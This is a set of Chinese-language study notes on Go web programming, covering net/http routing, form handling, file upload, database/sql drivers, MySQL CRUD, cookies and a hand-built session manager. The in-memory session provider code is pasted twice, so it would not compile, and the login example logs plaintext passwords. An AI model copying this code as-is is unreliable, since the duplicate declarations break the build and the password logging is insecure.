## Go如何使得Web工作
1. **web工作方式的几个概念**
以下均是服务器端的几个概念
Request：用户请求的信息，用来解析用户的请求信息，包括post、get、cookie、url等信息
Response：服务器需要反馈给客户端的信息
Conn：用户的每次请求链接
Handler：处理请求和生成返回信息的处理逻辑
2. **分析http包运行机制**
1.创建Listen Socket, 监听指定的端口, 等待客户端请求到来。
2.Listen Socket接受客户端的请求, 得到Client Socket, 接下来通过Client Socket
与客户端通信。
3.处理客户端的请求, 首先从Client Socket读取HTTP请求的协议头, 如果是POST方法, 还可能要读取客户端提交的数据, 然后交给相应的handler处理请求,handler处理完毕准备好客户端需要的数据, 通过Client Socket写给客户端。

## Go的http包详解

Go的http有两个核心功能：Conn、ServeMux
### Conn的goroutine
与我们一般编写的http服务器不同, Go为了实现高并发和高性能, 使用了goroutines来处理Conn的读写事件, 这样每个请求都能保持独立，相互不会阻塞，可以高效的响应网络事件。这是Go高效的保证。
Go在等待客户端请求里面是这样写的：
```go
c, err := srv.newConn(rw)
if err != nil {
continue
}
go c.serve()
```
这里我们可以看到客户端的每次请求都会创建一个Conn，这个Conn里面保存了该次请求的信息，然后再传递到对应的handler，该handler中便可以读取到相应的header信息，这样保证了每个请求的独立性。
### ServeMux的自定义
我们前面小节讲述conn.server的时候，其实内部是调用了http包默认的路由器，通过路由器把本次请求的信息传递到了后端的处理函数。
它的结构如下：
```go
type ServeMux struct {
mu sync.RWMutex //锁，由于请求涉及到并发处理，因此这里需要一个锁机制
m map[string]muxEntry // 路由规则，一个string对应一个mux实体，这里的string就是注册的路由表达式
hosts bool // 是否在任意的规则中带有host信息
}
```
**muxEntry**
```go
type muxEntry struct {
explicit bool // 是否精确匹配
h Handler // 这个路由表达式对应哪个handler
pattern string //匹配字符串
}
```
**Handler**
```go
type Handler interface {
ServeHTTP(ResponseWriter, *Request) // 路由实现器
}
```

HandlerFunc(f),强制类型转换f成为HandlerFunc类型，这样f就拥有了ServeHTTP方法。
```go
type HandlerFunc func(ResponseWriter, *Request)
// ServeHTTP calls f(w, r).
func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) {
f(w, r)
}
```
默认的路由器实现了 ServeHTTP ：

```go
func (mux *ServeMux) ServeHTTP(w ResponseWriter, r *Request) {
if r.RequestURI == "*" {
w.Header().Set("Connection", "close")
w.WriteHeader(StatusBadRequest)
return
}
h, _ := mux.Handler(r)
h.ServeHTTP(w, r)
}
```
如上所示路由器接收到请求之后，如果是 * 那么关闭链接，不然调用 mux.Handler(r) 返回对应设置路由的处理Handler，然后执行 h.ServeHTTP(w, r)也就是调用对应路由的handler的ServerHTTP接口，那么mux.Handler(r)怎么处理的呢？
```go
func (mux *ServeMux) Handler(r *Request) (h Handler, pattern string) {
if r.Method != "CONNECT" {
if p := cleanPath(r.URL.Path); p != r.URL.Path {
_, pattern = mux.handler(r.Host, p)
return RedirectHandler(p, StatusMovedPermanently),pattern
}
}
return mux.handler(r.Host, r.URL.Path)
}
func (mux *ServeMux) handler(host, path string) (h Handler, pattern string) {
mux.mu.RLock()
defer mux.mu.RUnlock()
// Host-specific pattern takes precedence over generic ones
if mux.hosts {
h, pattern = mux.match(host + path)
}
if h == nil {
h, pattern = mux.match(path)
}
if h == nil {
h, pattern = NotFoundHandler(), ""
}
return
}
```
原来他是根据用户请求的URL和路由器里面存储的map去匹配的，当匹配到之后返回存储的handler，调用这个handler的ServeHTTP接口就可以执行到相应的函数了。
通过上面这个介绍，我们了解了整个路由过程，Go其实支持外部实现的路由器ListenAndServe 的第二个参数就是用以配置外部路由器的，它是一个Handler接口，即外部路由器只要实现了Handler接口就可以,我们可以在自己实现的路由器的ServeHTTP里面实现自定义路由功能。
如下代码所示，我们自己实现了一个简易的路由器
```go
package main
import (
"fmt"
"net/http"
)
type MyMux struct {
}
func (p *MyMux) ServeHTTP(w http.ResponseWriter, r *http.Request) {
if r.URL.Path == "/" {
sayhelloName(w, r)
return
}
http.NotFound(w, r)
return
}
func sayhelloName(w http.ResponseWriter, r *http.Request) {
fmt.Fprintf(w, "Hello myroute!")
}
func main() {
mux := &MyMux{}
http.ListenAndServe(":9090", mux)
}
```
**Go代码的执行流程**
通过对http包的分析之后，现在让我们来梳理一下整个的代码执行过程。
首先调用Http.HandleFunc
按顺序做了几件事：
1 调用了DefaultServeMux的HandleFunc
2 调用了DefaultServeMux的Handle
3 往DefaultServeMux的map[string]muxEntry中增加对应的handler和路由规则
其次调用http.ListenAndServe(":9090", nil)
按顺序做了几件事情：
1 实例化Server
2 调用Server的ListenAndServe()
3 调用net.Listen("tcp", addr)监听端口
4 启动一个for循环，在循环体中Accept请求
5 对每个请求实例化一个Conn，并且开启一个goroutine为这个请求进行服务
go c.serve()
6 读取每个请求的内容w, err := c.readRequest()
7 判断handler是否为空，如果没有设置handler（这个例子就没有设置
handler），handler就设置为DefaultServeMux
8 调用handler的ServeHttp
9 在这个例子中，下面就进入到DefaultServeMux.ServeHttp
10 根据request选择handler，并且进入到这个handler的ServeHTTP
mux.handler(r).ServeHTTP(w, r)
11 选择handler：
A 判断是否有路由能满足这个request（循环遍历ServerMux的muxEntry）
B 如果有路由满足，调用这个路由handler的ServeHttp
C 如果没有路由满足，调用NotFoundHandler的ServeHttp

### 获取图片
```go
package main
import (
"bytes"
"fmt"
"io"
"io/ioutil"
"mime/multipart"
"net/http"
"os"
)
func postFile(filename string, targetUrl string) error {
 //直接定义一个Buffer变量，不用初始化，可以直接使用
bodyBuf := &bytes.Buffer{}
bodyWriter := multipart.NewWriter(bodyBuf)
//创建文件
fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)
if err != nil {
fmt.Println("error writing to buffer")
return err
}
//打开文件句柄操作
fh, err := os.Open(filename)
if err != nil {
fmt.Println("error opening file")
return err
}
defer fh.Close()
//iocopy
_, err = io.Copy(fileWriter, fh)
if err != nil {
return err
}
contentType := bodyWriter.FormDataContentType()
bodyWriter.Close()
resp, err := http.Post(targetUrl, contentType, bodyBuf)
if err != nil {
return err
}
defer resp.Body.Close()
resp_body, err := ioutil.ReadAll(resp.Body)
if err != nil {
return err
}
fmt.Println(resp.Status)
fmt.Println(string(resp_body))
return nil
}
// sample usage
func main() {
target_url := "http://localhost:9090/upload"
filename := "./astaxie.pdf"
postFile(filename, target_url)
}

```
通过上面的代码可以看到，处理文件上传我们需要调
用 r.ParseMultipartForm ，里面的参数表示 maxMemory ，调用 ParseMultipartForm 之后，上传的文件存储在maxMemory 大小的内存里面，如果文件大小超过了 maxMemory ，那么剩下的部分将存储在系统的临时文件中。我们可以通过 r.FormFile 获取上面的文件句柄，然后实例中使用了 io.Copy 来存储文件。
获取其他非文件字段信息的时候就不需要调用 r.ParseForm ，因为在需要的时候Go自动会去调用。而且ParseMultipartForm 调用一次之后，后面再次调用不会再有效果。

## 表单
### 处理表单的输入
先来看一个表单递交的例子，我们有如下的表单内容，命名成文件login.gtpl(放入当前新建项目的目录里面)

```go
<html>
<head>
<title></title>
</head>
<body>
<form action="/login" method="post">
    用户名:<input type="text" name="username">
    密码:<input type="password" name="password">
    <input type="submit" value="登录">
</form>
</body>
</html>
```
上面递交表单到服务器的/login，当用户输入信息点击登录之后，会跳转到服务器的路由login里面，我们首先要判断这个是什么方式传递过来，POST还是GET呢？

http包里面有一个很简单的方式就可以获取，我们在前面web的例子的基础上来看看怎么处理login页面的form数据

```go
package main

import (
    "fmt"
    "html/template"
    "log"
    "net/http"
    "strings"
)

func sayhelloName(w http.ResponseWriter, r *http.Request) {
    r.ParseForm()       //解析url传递的参数，对于POST则解析响应包的主体（request body）
    //注意:如果没有调用ParseForm方法，下面无法获取表单的数据
    fmt.Println(r.Form) //这些信息是输出到服务器端的打印信息
    fmt.Println("path", r.URL.Path)
    fmt.Println("scheme", r.URL.Scheme)
    fmt.Println(r.Form["url_long"])
    for k, v := range r.Form {
        fmt.Println("key:", k)
        fmt.Println("val:", strings.Join(v, ""))
    }
    fmt.Fprintf(w, "Hello astaxie!") //这个写入到w的是输出到客户端的
}

func login(w http.ResponseWriter, r *http.Request) {
    fmt.Println("method:", r.Method) //获取请求的方法
    if r.Method == "GET" {
        t, _ := template.ParseFiles("login.gtpl")
        log.Println(t.Execute(w, nil))
    } else {
        //请求的是登录数据，那么执行登录的逻辑判断
        fmt.Println("username:", r.Form["username"])
        fmt.Println("password:", r.Form["password"])
    }
}

func main() {
    http.HandleFunc("/", sayhelloName)       //设置访问的路由
    http.HandleFunc("/login", login)         //设置访问的路由
    err := http.ListenAndServe(":9090", nil) //设置监听的端口
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}
```
通过上面的代码我们可以看出获取请求方法是通过r.Method来完成的，这是个字符串类型的变量，返回GET, POST, PUT等method信息。

login函数中我们根据r.Method来判断是显示登录界面还是处理登录逻辑。当GET方式请求时显示登录界面，其他方式请求时则处理登录逻辑，如查询数据库、验证登录信息等。

当我们在浏览器里面打开http://127.0.0.1:9090/login的时候，出现如下界面



如果你看到一个空页面，可能是你写的 login.gtpl 文件中有错误，请根据控制台中的日志进行修复。

图4.1 用户登录界面

我们输入用户名和密码之后发现在服务器端是不会打印出来任何输出的，为什么呢？默认情况下，Handler里面是不会自动解析form的，必须显式的调用r.ParseForm()后，你才能对这个表单数据进行操作。我们修改一下代码，在fmt.Println("username:", r.Form["username"])之前加一行r.ParseForm(),重新编译，再次测试输入递交，现在是不是在服务器端有输出你的输入的用户名和密码了。

r.Form里面包含了所有请求的参数，比如URL中query-string、POST的数据、PUT的数据，所以当你在URL中的query-string字段和POST冲突时，会保存成一个slice，里面存储了多个值，Go官方文档中说在接下来的版本里面将会把POST、GET这些数据分离开来。

现在我们修改一下login.gtpl里面form的action值http://127.0.0.1:9090/login修改为http://127.0.0.1:9090/login?username=astaxie，再次测试，服务器的输出username是不是一个slice。服务器端的输出如下：



图4.2 服务器端打印接收到的信息

request.Form是一个url.Values类型，里面存储的是对应的类似key=value的信息，下面展示了可以对form数据进行的一些操作:


v := url.Values{}
v.Set("name", "Ava")
v.Add("friend", "Jess")
v.Add("friend", "Sarah")
v.Add("friend", "Zoe")
// v.Encode() == "name=Ava&friend=Jess&friend=Sarah&friend=Zoe"
fmt.Println(v.Get("name"))
fmt.Println(v.Get("friend"))
fmt.Println(v["friend"])
## 访问数据库
Go没有内置的驱动支持任何的数据库，但是Go定义了database/sql接口，用户可以基于驱动接口开发相应数据库的驱动.

### database/sql接口
#### sql.Register
这个存在于database/sql的函数是用来注册数据库驱动的，当第三方开发者开发数据库驱动时，都会实现init函数，在init里面会调用这个 Register(name string, driver driver.Driver) 完成本驱动的注册。
我们来看一下mymysql、sqlite3的驱动里面都是怎么调用的：
```go
//https://github.com/mattn/go-sqlite3驱动
func init() {
sql.Register("sqlite3", &SQLiteDriver{})
}
//https://github.com/mikespook/mymysql驱动
// Driver automatically registered in database/sql
var d = Driver{proto: "tcp", raddr: "127.0.0.1:3306"}
func init() {
Register("SET NAMES utf8")
sql.Register("mymysql", &d)
}
```
我们看到第三方数据库驱动都是通过调用这个函数来注册自己的数据库驱动名称以
及相应的driver实现。在database/sql内部通过一个map来存储用户定义的相应驱
动。
```go
var drivers = make(map[string]driver.Driver)
drivers[name] = driver
```
因此通过database/sql的注册函数可以同时注册多个数据库驱动，只要不重复。
在我们使用database/sql接口和第三方库的时候经常看到如下:
```go
import (
"database/sql"
_ "github.com/mattn/go-sqlite3"
)
```
新手都会被这个 _ 所迷惑，其实这个就是Go设计的巧妙之处，我们在变量赋值的时候经常看到这个符号，它是用来忽略变量赋值的占位符，那么包引入用到这个符号也是相似的作用，这儿使用 _ 的意思是引入后面的包名而不直接使用这个包中定义的函数，变量等资源。
#### driver.Driver
Driver是一个数据库驱动的接口，他定义了一个method： Open(name string)，这个方法返回一个数据库的Conn接口。
type Driver interface {
Open(name string) (Conn, error)
}
返回的Conn只能用来进行一次goroutine的操作，也就是说不能把这个Conn应用于Go的多个goroutine里面。如下代码会出现错误
...
go goroutineA (Conn) //执行查询操作
go goroutineB (Conn) //执行插入操作
...
上面这样的代码可能会使Go不知道某个操作究竟是由哪个goroutine发起的,从而导
致数据混乱，比如可能会把goroutineA里面执行的查询操作的结果返回给
goroutineB从而使B错误地把此结果当成自己执行的插入数据。
第三方驱动都会定义这个函数，它会解析name参数来获取相关数据库的连接信息，解析完成后，它将使用此信息来初始化一个Conn并返回它。
#### driver.Conn
Conn是一个数据库连接的接口定义，他定义了一系列方法，这个Conn只能应用在一个goroutine里面，不能使用在多goroutine里面，详情请参考上面的说明。
```go
type Conn interface {
Prepare(query string) (Stmt, error)
Close() error
Begin() (Tx, error)
}
```
Prepare函数返回与当前连接相关的执行Sql语句的准备状态，可以进行查询、删除等操作。
Close函数关闭当前的连接，执行释放连接拥有的资源等清理工作。因为驱动实现了 database/sql里面建议的conn pool，所以你不用再去实现缓存conn之类的，这样
会容易引起问题。
Begin函数返回一个代表事务处理的Tx，通过它你可以进行查询,更新等操作，或者对事务进行回滚、递交。
#### driver.Stmt
Stmt是一种准备好的状态，和Conn相关联，而且只能应用于一个goroutine中，不能应用于多个goroutine。
```go
type Stmt interface {
Close() error
NumInput() int
Exec(args []Value) (Result, error)
Query(args []Value) (Rows, error)
}
```
Close函数关闭当前的链接状态，但是如果当前正在执行query，query还是有效返回rows数据。
NumInput函数返回当前预留参数的个数，当返回>=0时数据库驱动就会智能检查调用者的参数。当数据库驱动包不知道预留参数的时候，返回-1。
Exec函数执行Prepare准备好的sql，传入参数执行update/insert等操作，返回Result数据
Query函数执行Prepare准备好的sql，传入需要的参数执行select操作，返回Rows结果集

#### driver.Tx
事务处理一般就两个过程，递交或者回滚。数据库驱动里面也只需要实现这两个函数就可以
```go
type Tx interface {
Commit() error
Rollback() error
}
```
这两个函数一个用来递交一个事务，一个用来回滚事务。
#### driver.Execer
这是一个Conn可选择实现的接口
```go
type Execer interface {
Exec(query string, args []Value) (Result, error)
}
```
如果这个接口没有定义，那么在调用DB.Exec,就会首先调用Prepare返回Stmt，然后执行Stmt的Exec，然后关闭Stmt。

#### driver.Result
这个是执行Update/Insert等操作返回的结果接口定义
```go
type Result interface {
LastInsertId() (int64, error)
RowsAffected() (int64, error)
}
```
LastInsertId函数返回由数据库执行插入操作得到的自增ID号。
RowsAffected函数返回query操作影响的数据条目数。
#### driver.Rows
Rows是执行查询返回的结果集接口定义
```go
type Rows interface {
Columns() []string
Close() error
Next(dest []Value) error
}
```
Columns函数返回查询数据库表的字段信息，这个返回的slice和sql查询的字段一一对应，而不是返回整个表的所有字段。
Close函数用来关闭Rows迭代器。
Next函数用来返回下一条数据，把数据赋值给dest。dest里面的元素必须是driver.Value的值除了string，返回的数据里面所有的string都必须要转换成[]byte。如果最后没数据了，Next函数最后返回io.EOF。

#### driver.RowsAffected
RowsAffected其实就是一个int64的别名，但是他实现了Result接口，用来底层实现Result的表示方式
```go
type RowsAffected int64
func (RowsAffected) LastInsertId() (int64, error)
func (v RowsAffected) RowsAffected() (int64, error)
```
#### driver.Value
Value其实就是一个空接口，他可以容纳任何的数据
type Value interface{}
drive的Value是驱动必须能够操作的Value，Value要么是nil，要么是下面的任意一种
```go
int64
float64
bool
[]byte
string [*]除了Rows.Next返回的不能是string.
time.Time
```
#### driver.ValueConverter
ValueConverter接口定义了如何把一个普通的值转化成driver.Value的接口
```go
type ValueConverter interface {
ConvertValue(v interface{}) (Value, error)
}
```
在开发的数据库驱动包里面实现这个接口的函数在很多地方会使用到，这个ValueConverter有很多好处：
- 转化driver.value到数据库表相应的字段，例如int64的数据如何转化成数据库表uint16字段
- 把数据库查询结果转化成driver.Value值
- 在scan函数里面如何把driver.Value值转化成用户定义的值
#### driver.Valuer
Valuer接口定义了返回一个driver.Value的方式
```go
type Valuer interface {
Value() (Value, error)
}
```
很多类型都实现了这个Value方法，用来自身与driver.Value的转化。

#### database/sql
database/sql在database/sql/driver提供的接口基础上定义了一些更高阶的方法，用以简化数据库操作,同时内部还建议性地实现一个conn pool。
```sql
type DB struct {
driver driver.Driver
dsn string
mu sync.Mutex // protects freeConn and closed
freeConn []driver.Conn
closed bool
}
```

我们可以看到Open函数返回的是DB对象，里面有一个freeConn，它就是那个简易的连接池。它的实现相当简单或者说简陋，就是当执行Db.prepare的时候会 defer db.putConn(ci, err) ,也就是把这个连接放入连接池，每次调用conn的时候会先判断freeConn的长度是否大于0，大于0说明有可以复用的conn，直接拿出来用就是了，如果不大于0，则创建一个conn,然后再返回之。
### 使用MySQL数据库
#### MySQL驱动
接下来的几个小节里面我们都将采用同一个数据库表结构：数据库test，用户表userinfo，关联用户信息表userdetail。
```sql
CREATE TABLE `userinfo` (
`uid` INT(10) NOT NULL AUTO_INCREMENT,
`username` VARCHAR(64) NULL DEFAULT NULL,
`departname` VARCHAR(64) NULL DEFAULT NULL,
`created` DATE NULL DEFAULT NULL,
PRIMARY KEY (`uid`)
)
CREATE TABLE `userdetail` (
`uid` INT(10) NOT NULL DEFAULT '0',
`intro` TEXT NULL,
`profile` TEXT NULL,
PRIMARY KEY (`uid`)
)
```
如下示例将示范如何使用database/sql接口对数据库表进行增删改查操作
```go
package main
import (
_ "github.com/go-sql-driver/mysql"
"database/sql"
"fmt"
//"time"
)
func main() {
// 数据库种类，和数据库连接信息
db, err := sql.Open("mysql", "astaxie:astaxie@/test?charset=utf8")

checkErr(err)
//插入数据
stmt, err := db.Prepare("INSERT userinfo SET username=?,departname=?,created=?")
checkErr(err)
res, err := stmt.Exec("astaxie", "研发部门", "2012-12-09")
checkErr(err)
id, err := res.LastInsertId()
checkErr(err)
fmt.Println(id)
//更新数据
stmt, err = db.Prepare("update userinfo set username=? where uid=?")
checkErr(err)
res, err = stmt.Exec("astaxieupdate", id)
checkErr(err)
affect, err := res.RowsAffected()
checkErr(err)
fmt.Println(affect)
//查询数据
rows, err := db.Query("SELECT * FROM userinfo")
checkErr(err)
for rows.Next() {
var uid int
var username string
var department string
var created string
err = rows.Scan(&uid, &username, &department, &created)
checkErr(err)
fmt.Println(uid)
fmt.Println(username)
fmt.Println(department)
fmt.Println(created)
}
//删除数据
stmt, err = db.Prepare("delete from userinfo where uid=?")
checkErr(err)
res, err = stmt.Exec(id)
checkErr(err)
affect, err = res.RowsAffected()
checkErr(err)
fmt.Println(affect)
db.Close()
}
func checkErr(err error) {
if err != nil {
panic(err)
}
}
```
## session和cookie
### cookie
Go语言中通过net/http包中的SetCookie来设置：
**http.SetCookie(w ResponseWriter, cookie *Cookie)**
w表示需要写入的response，cookie是一个struct，让我们来看一下cookie对象是怎么样的
```go
type Cookie struct {
Name string
Value string
Path string
Domain string
Expires time.Time
RawExpires string
// MaxAge=0 means no 'Max-Age' attribute specified.
// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
// MaxAge>0 means Max-Age attribute present and given in seconds
MaxAge int
Secure bool
HttpOnly bool
Raw string
Unparsed []string // Raw text of unparsed attribute-value pairs
}
```
我们来看一个例子，如何设置cookie
```go
expiration := time.Now()
expiration = expiration.AddDate(1, 0, 0)
cookie := http.Cookie{Name: "username", Value: "astaxie", Expires: expiration}
http.SetCookie(w, &cookie)
```
Go读取cookie
上面的例子演示了如何设置cookie数据，我们这里来演示一下如何读取cookie
```go
cookie, _ := r.Cookie("username")
fmt.Fprint(w, cookie)
还有另外一种读取方式
for _, cookie := range r.Cookies() {
fmt.Fprint(w, cookie.Name)
}
```

### session
通过上一小节的介绍，我们知道session是在服务器端实现的一种用户和服务器之间认证的解决方案，目前Go标准包没有为session提供任何支持，这小节我们将会自己动手来实现go版本的session管理和创建。
#### session创建过程
session的基本原理是由服务器为每个会话维护一份信息数据，客户端和服务端依靠一个全局唯一的标识来访问这份数据，以达到交互的目的。当用户访问Web应用时，服务端程序会随需要创建session，这个过程可以概括为三个步骤：
- 生成全局唯一标识符（sessionid）；
- 开辟数据存储空间。一般会在内存中创建相应的数据结构，但这种情况下，系统一旦掉电，所有的会话数据就会丢失，如果是电子商务类网站，这将造成严重的后果。所以为了解决这类问题，你可以将会话数据写到文件里或存储在数据库中，当然这样会增加I/O开销，但是它可以实现某种程度的session持久化，也更有利于session的共享；
- 将session的全局唯一标示符发送给客户端。
以上三个步骤中，最关键的是如何发送这个session的唯一标识这一步上。考虑到HTTP协议的定义，数据无非可以放到请求行、头域或Body里，所以一般来说会有两种常用的方式：cookie和URL重写。
1. Cookie 服务端通过设置Set-cookie头就可以将session的标识符传送到客户端，而客户端此后的每一次请求都会带上这个标识符，另外一般包含session信息的cookie会将失效时间设置为0(会话cookie)，
2. URL重写 所谓URL重写，就是在返回给用户的页面里的所有的URL后面追加session标识符，这样用户在收到响应之后，无论点击响应页面里的哪个链接或提交表单，都会自动带上session标识符，从而就实现了会话的保持。虽然这种做法比较麻烦，但是，如果客户端禁用了cookie的话，此种方案将会是首选。
#### Go实现session管理

我们知道session管理涉及到如下几个因素

- 全局session管理器
- 保证sessionid 的全局唯一性
- 为每个客户关联一个session
- session 的存储(可以存储到内存、文件、数据库等)
- session 过期处理

##### Session管理器
定义一个全局的session管理器
```go
type Manager struct {
cookieName string //private cookiename
lock sync.Mutex // protects session
provider Provider
maxlifetime int64
}
func NewManager(provideName, cookieName string, maxlifetime int64) (*Manager, error) {
provider, ok := provides[provideName]
if !ok {
return nil, fmt.Errorf("session: unknown provide %q (forgotten import?)", provideName)
}
return &Manager{provider: provider, cookieName: cookieName, maxlifetime: maxlifetime}, nil
}
```

Go实现整个的流程应该也是这样的，在main包中创建一个全局的session管理器
```go
var globalSessions *session.Manager
//然后在init函数中初始化
func init() {
globalSessions, _ = NewManager("memory","gosessionid",3600)
}
```
我们知道session是保存在服务器端的数据，它可以以任何的方式存储，比如存储在内存、数据库或者文件中。因此我们抽象出一个Provider接口，用以表征session管理器底层存储结构。
```go
type Provider interface {
SessionInit(sid string) (Session, error)
SessionRead(sid string) (Session, error)
SessionDestroy(sid string) error
SessionGC(maxLifeTime int64)
}
```

- SessionInit函数实现Session的初始化，操作成功则返回此新的Session变量
- SessionRead函数返回sid所代表的Session变量，如果不存在，那么将以sid为参数调用SessionInit函数创建并返回一个新的Session变量
- SessionDestroy函数用来销毁sid对应的Session变量
- SessionGC根据maxLifeTime来删除过期的数据
那么Session接口需要实现什么样的功能呢？有过Web开发经验的读者知道，对Session的处理基本就 设置值、读取值、删除值以及获取当前sessionID这四个操
作，所以我们的Session接口也就实现这四个操作。
```go
type Session interface {
Set(key, value interface{}) error //set session value
Get(key interface{}) interface{} //get session value
Delete(key interface{}) error //delete session value
SessionID() string //back current sessionID
}
```
以上设计思路来源于database/sql/driver，先定义好接口，然后具体的存储session的结构实现相应的接口并注册后，相应功能这样就可以使用了，以下是用来随需注册存储session的结构的Register函数的实现。
```go
var provides = make(map[string]Provider)
// Register makes a session provide available by the provided name.
// If Register is called twice with the same name or if driver is nil,
// it panics.
func Register(name string, provider Provider) {
if provider == nil {
panic("session: Register provide is nil")
}
if _, dup := provides[name]; dup {
panic("session: Register called twice for provide " + name)
}
provides[name] = provider
}
```
#### 全局唯一的Session ID
Session ID是用来识别访问Web应用的每一个用户，因此必须保证它是全局唯一的（GUID），下面代码展示了如何满足这一需求：
```go
func (manager *Manager) sessionId() string {
b := make([]byte, 32)
if _, err := io.ReadFull(rand.Reader, b); err != nil {
return ""
}
return base64.URLEncoding.EncodeToString(b)
}
```
#### session创建
我们需要为每个来访用户分配或获取与他相关连的Session，以便后面根据Session信息来验证操作。SessionStart这个函数就是用来检测是否已经有某个Session与当前来访用户发生了关联，如果没有则创建之。
```go
func (manager *Manager) SessionStart(w http.ResponseWriter, r *http.Request) (session Session) {
manager.lock.Lock()
defer manager.lock.Unlock()
cookie, err := r.Cookie(manager.cookieName)
if err != nil || cookie.Value == "" {
sid := manager.sessionId()
session, _ = manager.provider.SessionInit(sid)
cookie := http.Cookie{Name: manager.cookieName, Value: url.QueryEscape(sid), Path: "/", HttpOnly: true, MaxAge: int(manager.maxlifetime)}
http.SetCookie(w, &cookie)
} else {
sid, _ := url.QueryUnescape(cookie.Value)
session, _ = manager.provider.SessionRead(sid)
}
return
}
```
我们用前面login操作来演示session的运用：
```go
func login(w http.ResponseWriter, r *http.Request) {
sess := globalSessions.SessionStart(w, r)
r.ParseForm()
if r.Method == "GET" {
t, _ := template.ParseFiles("login.gtpl")
w.Header().Set("Content-Type", "text/html")
t.Execute(w, sess.Get("username"))
} else {
sess.Set("username", r.Form["username"])
http.Redirect(w, r, "/", 302)
}
}
```
#### 操作值：设置、读取和删除

上面的例子中的代码 session.Get("uid") 已经展示了基本的读取数据的操作，现在我们再来看一下详细的操作:
```go
func count(w http.ResponseWriter, r *http.Request) {
sess := globalSessions.SessionStart(w, r)
createtime := sess.Get("createtime")
if createtime == nil {
sess.Set("createtime", time.Now().Unix())
} else if (createtime.(int64) + 360) < (time.Now().Unix()) {
globalSessions.SessionDestroy(w, r)
sess = globalSessions.SessionStart(w, r)
}
ct := sess.Get("countnum")
if ct == nil {
sess.Set("countnum", 1)
} else {
sess.Set("countnum", (ct.(int) + 1))
}
t, _ := template.ParseFiles("count.gtpl")
w.Header().Set("Content-Type", "text/html")
t.Execute(w, sess.Get("countnum"))
}
```
通过上面的例子可以看到，Session的操作和操作key/value数据库类似:Set、Get、Delete等操作
因为Session有过期的概念，所以我们定义了GC操作，当访问过期时间满足GC的触发条件后将会引起GC，但是当我们进行了任意一个session操作，都会对Session实体进行更新，都会触发对最后访问时间的修改，这样当GC的时候就不会误删除还在使用的Session实体。

#### session重置
我们知道，Web应用中有用户退出这个操作，那么当用户退出应用的时候，我们需要对该用户的session数据进行销毁操作，上面的代码已经演示了如何使用session重置操作，下面这个函数就是实现了这个功能：
```go
//Destroy sessionid
func (manager *Manager) SessionDestroy(w http.ResponseWriter, r *http.Request){
cookie, err := r.Cookie(manager.cookieName)
if err != nil || cookie.Value == "" {
return
} else {
manager.lock.Lock()
defer manager.lock.Unlock()
manager.provider.SessionDestroy(cookie.Value)
expiration := time.Now()
cookie := http.Cookie{Name: manager.cookieName, Path: "/", HttpOnly: true, Expires: expiration, MaxAge: -1}
http.SetCookie(w, &cookie)
}
}
```
#### session销毁
我们来看一下Session管理器如何来管理销毁,只要我们在Main启动的时候启动：
```go
func init() {
go globalSessions.GC()
}
func (manager *Manager) GC() {
manager.lock.Lock()
defer manager.lock.Unlock()
manager.provider.SessionGC(manager.maxlifetime)
time.AfterFunc(time.Duration(manager.maxlifetime), func() { manager.GC() })
}
```
我们可以看到GC充分利用了time包中的定时器功能，当超时 maxLifeTime 之后调用GC函数，这样就可以保证 maxLifeTime 时间内的session都是可用的，类似的
方案也可以用于统计在线用户数之类的。

### session存储
上一节我们介绍了Session管理器的实现原理，定义了存储session的接口，这小节我们将示例一个基于内存的session存储接口的实现，其他的存储方式，
```go
package memory
import (
"container/list"
"github.com/astaxie/session"
"sync"
"time"
)
var pder = &Provider{list: list.New()}
type SessionStore struct {
sid string //session id唯一标示
timeAccessed time.Time //最后访问时间
value map[interface{}]interface{} //session里面存储的值
}
func (st *SessionStore) Set(key, value interface{}) error {
st.value[key] = value
pder.SessionUpdate(st.sid)
return nil
}
func (st *SessionStore) Get(key interface{}) interface{} {
pder.SessionUpdate(st.sid)
if v, ok := st.value[key]; ok {
return v
} else {
return nil
}
return nil
}
func (st *SessionStore) Delete(key interface{}) error {
delete(st.value, key)
pder.SessionUpdate(st.sid)
return nil
}
func (st *SessionStore) SessionID() string {
return st.sid
}
type Provider struct {
lock sync.Mutex //用来锁
sessions map[string]*list.Element //用来存储在内存
list *list.List //用来做gc
}
func (pder *Provider) SessionInit(sid string) (session.Session, error) {
pder.lock.Lock()
defer pder.lock.Unlock()
v := make(map[interface{}]interface{}, 0)
newsess := &SessionStore{sid: sid, timeAccessed: time.Now(), value: v}
element := pder.list.PushBack(newsess)
pder.sessions[sid] = element
return newsess, nil
}
func (pder *Provider) SessionRead(sid string) (session.Session, error) {
if element, ok := pder.sessions[sid]; ok {
return element.Value.(*SessionStore), nil
} else {
sess, err := pder.SessionInit(sid)
return sess, err
}
return nil, nil
}
func (pder *Provider) SessionDestroy(sid string) error {
if element, ok := pder.sessions[sid]; ok {
delete(pder.sessions, sid)
pder.list.Remove(element)
return nil
}
return nil
}
func (pder *Provider) SessionGC(maxlifetime int64) {
pder.lock.Lock()
defer pder.lock.Unlock()
for {
element := pder.list.Back()
if element == nil {
break
}
if (element.Value.(*SessionStore).timeAccessed.Unix() + maxlifetime) < time.Now().Unix() {
pder.list.Remove(element)
delete(pder.sessions, element.Value.(*SessionStore).sid)
} else {
break
}
}
}
type Provider struct {
lock sync.Mutex //用来锁
sessions map[string]*list.Element //用来存储在内存
list *list.List //用来做gc
}
func (pder *Provider) SessionInit(sid string) (session.Session, error) {
pder.lock.Lock()
defer pder.lock.Unlock()
v := make(map[interface{}]interface{}, 0)
newsess := &SessionStore{sid: sid, timeAccessed: time.Now(), value: v}
element := pder.list.PushBack(newsess)
pder.sessions[sid] = element
return newsess, nil
}
func (pder *Provider) SessionRead(sid string) (session.Session, error) {
if element, ok := pder.sessions[sid]; ok {
return element.Value.(*SessionStore), nil
} else {
sess, err := pder.SessionInit(sid)
return sess, err
}
return nil, nil
}
func (pder *Provider) SessionDestroy(sid string) error {
if element, ok := pder.sessions[sid]; ok {
delete(pder.sessions, sid)
pder.list.Remove(element)
return nil
}
return nil
}
func (pder *Provider) SessionGC(maxlifetime int64) {
pder.lock.Lock()
defer pder.lock.Unlock()
for {
element := pder.list.Back()
if element == nil {
break
}
if (element.Value.(*SessionStore).timeAccessed.Unix() + maxlifetime) < time.Now().Unix() {
pder.list.Remove(element)
delete(pder.sessions, element.Value.(*SessionStore).sid)
} else {
break
}
}
}
```
### 预防session劫持
